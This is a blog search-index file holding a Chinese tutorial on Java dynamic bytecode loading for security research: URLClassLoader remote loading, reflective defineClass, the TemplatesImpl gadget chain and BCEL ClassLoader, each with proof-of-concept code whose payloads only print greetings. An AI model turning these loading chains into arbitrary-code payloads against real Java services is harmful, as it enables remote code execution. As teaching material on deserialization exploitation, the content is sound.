<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>JavaWeb-动态加载字节码</title>
    <link href="/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/"/>
    <url>/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<p>这次续上CC3里没讲完的动态加载字节码。</p><h2 id="利用-URLClassLoader-加载远程class文件"><a href="#利用-URLClassLoader-加载远程class文件" class="headerlink" title="利用 URLClassLoader 加载远程class文件"></a>利用 URLClassLoader 加载远程class文件</h2><p>Java的<code>ClassLoader</code>来用来加载字节码文件最基础的方法。</p><p>学到这里，知道反射的人应该也很清楚，<code>ClassLoader</code>就是一个“加载器”，告诉Java虚拟机如何加载这个类。Java默认的<code>ClassLoader</code>就是根据类名来加载类，这个类名是类完整路径，如 <code>java.lang.Runtime</code> 。</p><p><code>ClassLoader</code>的概念的确很宽泛，所以我也不做深入分析，这里要说到的是这个 </p><p><code>ClassLoader</code>： <code>URLClassLoader</code> </p><p><code>URLClassLoader</code>实际上是我们平时默认使用的<code>AppClassLoader</code>的父类。</p><p>所以我们解释<code>URLClassLoader</code>的工作过程实际上就是在解释默认的Java类加载器的工作流程。 </p><p>正常情况下，Java会根据配置项<code>sun.boot.class.path</code>和<code>java.class.path</code>中列举到的基础路径（这些路径是经过处理后的<code>java.net.URL</code>类）来寻找.class文件来加载。</p><p>而这个基础路径有分为三种情况： </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">·URL未以斜杠/结尾，则认为是一个JAR文件，使用JarLoader来寻找类，即为在Jar包中寻找.class文件 <br>·URL以斜杠/结尾，且协议名是file，则使用FileLoader来寻找类，即为在本地文件系统中寻找.class文件<br>·URL以斜杠/结尾，且协议名不是file，则使用最基础的Loader来寻找类 <br></code></pre></td></tr></table></figure><p>我们正常开发的时候通常遇到的是前两者，那什么时候才会出现使用Loader寻找类的情况呢？</p><p>当然是非file协议的情况下，最常见的就是<strong>http协议</strong>。</p><p>HTTP小测：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloClassLoader</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        URL[] urls = &#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://localhost:8000/&quot;</span>)&#125;;<br>        <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">loader</span> <span class="hljs-operator">=</span> URLClassLoader.newInstance(urls);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> loader.loadClass(<span class="hljs-string">&quot;Hello&quot;</span>);<br>        c.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们编译一个简单的HelloWorld程序，放在<a href="http://localhost:8000/Hello.class%EF%BC%9A">http://localhost:8000/Hello.class：</a></p><p><img src="/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240730003225504.png" alt="image-20240730003225504"></p><p><img src="/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240730003325045.png" alt="image-20240730003325045"></p><p>成功请求到我们的<code>/Hello.class</code>文件，并执行了文件里的字节码，输出”Hello World”。</p><p>所以，作为攻击者，如果我们能够控制目标<code>Java ClassLoader</code>的基础路径为一个http服务器，则可以<strong>利用远程加载的方式执行任意代码</strong>了。</p><h2 id="利用-ClassLoader-defineClass-直接加载字节码"><a href="#利用-ClassLoader-defineClass-直接加载字节码" class="headerlink" title="利用 ClassLoader#defineClass 直接加载字节码"></a>利用 ClassLoader#defineClass 直接加载字节码</h2><p>其实不管是加 载远程class文件，还是本地的class或jar文件，Java都经历的是下面这三个方法调用：</p><p><img src="/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240730002859489.png" alt="image-20240730002859489"></p><p>其中： </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">·loadClass 的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机制），在前面没有找到的情况下，执行 findClass <br>·findClass 的作用是根据基础URL指定的方式来加载类的字节码，可能会在本地文件系统、jar包或远程http服务器上读取字节码，然后交给 defineClass <br>·defineClass 的作用是处理前面传入的字节码，将其处理成真正的Java类<br></code></pre></td></tr></table></figure><p>所以可见，真正核心的部分其实是 <code>defineClass</code> ，他决定了如何将一段字节流转变成一个Java类，Java 默认的 <code>ClassLoader#defineClass</code> 是一个<code>native</code>方法，逻辑在JVM的C语言代码中。 </p><p>我们可以编写一个简单的代码，来演示如何让系统的 <code>defineClass</code> 来直接加载字节码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloDefineClass</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">defineClass</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);<br>        defineClass.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">hello</span> <span class="hljs-operator">=</span> (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="hljs-string">&quot;Hello&quot;</span>, code, <span class="hljs-number">0</span>, code.length);<br>        hello.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>注意一点，在 <code>defineClass</code> 被调用的时候，类对象是不会被初始化的，只有这个对象显式地调用其构造函数，初始化代码才能被执行。</p><p>而且，即使我们将初始化代码放在类的<code>static</code>块中，在 <code>defineClass</code> 时也无法被直接调用到。</p><p>所以，如果我们要使用<code>defineClass</code>在目标机器上执行任意代码，需要想办法调用构造函数。  </p><p>执行上述example，输出了Hello World：</p><p><img src="/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240730003751282.png" alt="image-20240730003751282"></p><p>这里，因为系统的<code>ClassLoader#defineClass</code>是一个保护属性，所以我们无法直接在外部访问，不得不使用反射的形式来调用。 </p><p>在实际场景中，因为<code>defineClass</code>方法作用域是不开放的，所以攻击者很少能直接利用到它，但它却是我们常用的一个攻击链<code>TemplatesImpl</code>的基石。</p><h2 id="利用-TemplatesImpl-加载字节码"><a href="#利用-TemplatesImpl-加载字节码" class="headerlink" title="利用 TemplatesImpl 加载字节码"></a>利用 TemplatesImpl 加载字节码</h2><p>重头戏来了。</p><p>虽然大部分上层开发者不会直接使用到<code>defineClass</code>方法，但是Java底层还是有一些类用到了它（否则他也没存在的价值了），这就是<code>TemplatesImpl</code>。 </p><p>引入一个玩意：</p><p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>这个类中定义了一个内部类:</p><p><code>TransletClassLoader</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransletClassLoader</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassLoader</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String,Class&gt; _loadedExternalExtensionFunctions;<br>    TransletClassLoader(ClassLoader parent) &#123;<br>        <span class="hljs-built_in">super</span>(parent);<br>        _loadedExternalExtensionFunctions = <span class="hljs-literal">null</span>;<br>    &#125;<br>    <br>    TransletClassLoader(ClassLoader parent,Map&lt;String, Class&gt; mapEF) &#123;<br>        <span class="hljs-built_in">super</span>(parent);<br>        _loadedExternalExtensionFunctions = mapEF;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        Class&lt;?&gt; ret = <span class="hljs-literal">null</span>;<br>        <span class="hljs-comment">// The _loadedExternalExtensionFunctions will be empty when the</span><br>        <span class="hljs-comment">// SecurityManager is not set and the FSP is turned off</span><br>        <span class="hljs-keyword">if</span> (_loadedExternalExtensionFunctions != <span class="hljs-literal">null</span>) &#123;<br>            ret = _loadedExternalExtensionFunctions.get(name);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (ret == <span class="hljs-literal">null</span>) &#123;<br>            ret = <span class="hljs-built_in">super</span>.loadClass(name);<br>        &#125;<br>        <span class="hljs-keyword">return</span> ret;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Access to final protected superclass member from outer class.</span><br><span class="hljs-comment">     */</span><br>     Class <span class="hljs-title function_">defineClass</span><span class="hljs-params">(<span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] b)</span> &#123;<br>        <span class="hljs-keyword">return</span> defineClass(<span class="hljs-literal">null</span>, b, <span class="hljs-number">0</span>, b.length);<br>    &#125;<br> &#125;<br></code></pre></td></tr></table></figure><p>这个类里重写了<code>defineClass</code>方法，并且这里没有显式地声明其定义域。</p><p>Java中默认情况下，如果一个方法没有显式声明作用域，其作用域为<code>default</code>。</p><p>所以也就是说这里的<code>defineClass</code>由其父类的<code>protected</code>类型变成了一个<code>default</code>类型的方法，可以被类外部调用。</p><p>我们从<code>TransletClassLoader#defineClass()</code>向前追溯一下调用链：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">TemplatesImpl#getOutputProperties() -&gt; <br>TemplatesImpl#newTransformer() -&gt; <br>TemplatesImpl#getTransletInstance() -&gt; <br>TemplatesImpl#defineTransletClasses() -&gt; <br>TransletClassLoader#defineClass()<br></code></pre></td></tr></table></figure><p>追到最前面两个方法<code>TemplatesImpl#getOutputProperties()</code>、 <code>TemplatesImpl#newTransformer()</code>，这两者的作用域是<code>public</code>，可以被外部调用。我们尝试用 <code>newTransformer()</code>构造一个简单的POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-comment">// source: bytecodes/HelloTemplateImpl.java</span><br>    <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=&quot;</span>);<br>    <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>    setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>    setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>    setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>    <br>    obj.newTransformer();<br>&#125;<br></code></pre></td></tr></table></figure><p>其中，<code>setFieldValue</code>方法用来设置私有属性，可见这里设置了三个属性：</p><p><code>_bytecodes</code>、<code>_name</code> 和<code>_tfactory</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">·_bytecodes是由字节码组成的数组；<br><br>·_name可以是任意字符串，只要不为<span class="hljs-literal">null</span>即可；<br><br>·_tfactory需要是一个TransformerFactoryImpl对象，因为 TemplatesImpl#defineTransletClasses()方法里有调用到_tfactory.getExternalExtensionsMap()，如果是<span class="hljs-literal">null</span>会出错。 <br></code></pre></td></tr></table></figure><p>另外值得注意的是，<code>TemplatesImpl</code>中对加载的字节码是有一定要求的：</p><p>这个字节码对应的类必须是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>的子类。</p><p>所以我们需要构造一个特殊的类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloTemplatesImpl</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <br><span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-title function_">HelloTemplatesImpl</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        System.out.println(<span class="hljs-string">&quot;Hello TemplatesImpl&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>它继承了 <code>AbstractTranslet</code> 类，并在构造函数里插入<code>Hello</code>的输出。</p><p>将其编译成字节码，即可被 <code>TemplatesImpl</code> 执行了：</p><p><img src="/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240730005336767.png" alt="image-20240730005336767"></p><h2 id="利用BCEL-ClassLoader加载字节码"><a href="#利用BCEL-ClassLoader加载字节码" class="headerlink" title="利用BCEL ClassLoader加载字节码"></a>利用BCEL ClassLoader加载字节码</h2><p>若我们认为所有能够恢复成一个类并在JVM虚拟机里加载的字节序列都在我们的探讨范围内。 </p><p>那么，<strong>BCEL字节码</strong>也必然在我们的讨论范围内，且占据着比较重要的地位。 </p><p><code>BCEL</code>的全名应该是<code>Apache Commons BCEL</code>，属于<code>Apache Commons</code>项目下的一个子项目，</p><p>但其因为被<code>Apache Xalan</code>所使用，而<code>Apache Xalan</code>又是Java内部对于JAXP的实现，所以BCEL也被包含在了JDK的原生库中。 </p><p>关于BCEL的详细介绍，请阅读p牛写的另一篇文章《<a href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">BCEL ClassLoader</a>去哪了》，建议阅读完这篇文章再来阅读。</p><p>我们可以通过BCEL提供的两个类<code>Repository</code>和<code>Utility</code>来利用：</p><p><code>Repository</code>用于将一个<code>Java Class</code>先转换成原生字节码，当然这里也可以直接使用<code>javac</code>命令来编译java文件生成字节码；</p><p><code>Utility</code>用于将原生的字节码转换成BCEL格式的字节码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.Repository;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloBCEL</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String []args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">JavaClass</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> Repository.lookupClass(evil.Hello.class);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> Utility.encode(cls.getBytes(), <span class="hljs-literal">true</span>);<br>        System.out.println(code);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240730005943078.png" alt="image-20240730005943078"></p><p>前面加个<code>$$BCEL$$</code>标识：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.Repository;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloBCEL</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String []args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//encode();</span><br>        decode();<br>    &#125;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">encode</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">JavaClass</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> Repository.lookupClass(evil.Hello.class);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> Utility.encode(cls.getBytes(), <span class="hljs-literal">true</span>);<br>        System.out.println(code);<br>    &#125;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">decode</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassLoader</span>().loadClass<br>                (<span class="hljs-string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQMK$c3$40$Q$7d$db$af41$b5$b5$b5$f5$5b$5bOU$c4$5c$E$P$V$_$82x$I$wT$ea$c1$d3$b6$5d$ea$96M$oiZ$f0g$e9A$c1$83$3f$c0$l$r$cen$LA$e8$k$e61of$de$be$d9$fd$f9$fd$fa$Gp$86C$H$F$ac$db$a8$a3Q$c4$86$83MlY$d8$b6$b0$c3P$b8$90$a1L$$$Z$b2$ed$a3$kC$ee$w$g$K$86$b2$_Cq$3b$N$fa$o$7e$e0$7dEL$d5$8f$G$5c$f5x$yu$be$ms$c9$b3$9c0$b8$be$98I$e5$dd$I$a5$a2$O$b1$B$97$nC$a3$fd$e4$8f$f9$8c$7b$8a$87$p$af$9b$c42$iu$cc$j$3c$k$d1T&quot;</span> +                <span class="hljs-string">&quot;mI$99$c1$e9F$d3x$m$ae$a5$d6w$8c$e4$a9nsa$a1ha$d7$c5$k$f6$ZJ$a6r$d2$7c$8cb5lY8p$d1D$8b$sR$t$&quot;</span> +              <span class="hljs-string">&quot;M$95T$ff$ae$3f$W$83$e4$l$d5$7d$9d$q$o$a0$c5$a3$v$V$eas32$f2$ee$c9IB$7e$E$P$c8Om$J$cd$60$bd$e8L$d1$96$f5$f6$b2$r$d1B$9e$9e$5c$9f$M$98$b6N$d1$a6$cc$pd$84$f9$e3O$b07Sv$u$W$M$99&quot;</span> +          <span class="hljs-string">&quot;$c5$KEw$de$40X$o$b4$b1$8a$f2b$f8$dc$88$R$f7$8eL5$fb$81$5c$w$e0$Q$ea$a1$oI$a5$o6$wX$p$a4$ef3$9d&quot;</span> + <span class="hljs-string">&quot;$b5$3f3$dbS$w$S$C$A$A&quot;</span>).newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240730011732779.png" alt="image-20240730011732779"></p><p><code>BCEL ClassLoader</code>在<code>Fastjson</code>等漏洞的利用链构造时都有被用到，其实这个类和前面的 <code>TemplatesImpl</code> 都出自于同一个第三方库，<code>Apache Xalan</code>。</p><p>但是由于各种原因（详见前面所说的 《BCEL ClassLoader 去哪了》），在<strong>Java <code>8u251</code>的更新中，这个ClassLoader被移除了</strong>，所以我JDK8u401的版本是会报错的：</p><p><img src="/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240730011841209.png" alt="image-20240730011841209"></p><p>但是这种使用<code>Repository.lookupClass()</code>的方法很常用，经常用于打入恶意字节码，后续遇到具体题目的时候就知道了。打复现的时候这几个加载字节码的方式都可能会出现。</p><p>参考：</p><p>p牛-Java安全漫谈 - 13.Java中动态加载字节码的那些方法</p><p><a href="https://wx.zsxq.com/dweb2/index/tags/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88/551511412514">知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具 (zsxq.com)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Commons Collections</title>
    <link href="/2024/07/28/Commons-Collections/"/>
    <url>/2024/07/28/Commons-Collections/</url>
    
